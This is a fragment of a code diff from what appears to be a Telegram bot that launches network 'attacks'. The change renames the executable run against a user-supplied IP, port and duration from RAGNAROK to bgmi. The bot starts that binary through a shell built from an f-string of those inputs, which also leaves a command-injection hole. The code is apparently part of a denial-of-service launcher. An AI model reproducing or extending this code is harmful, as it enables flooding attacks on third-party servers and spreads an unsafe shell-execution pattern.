@@ -131,7 +131,7 @@ def start_attack(call):
         bot.answer_callback_query(call.id, "⚠️ This isn't your attack session!", show_alert=True)
         return
 
-    full_command = f"./RAGNAROK {ip} {port} {duration} CRACKS"
+    full_command = f"./bgmi {ip} {port} {duration} CRACKS"
     subprocess.Popen(full_command, shell=True)
 
     # Store attack log
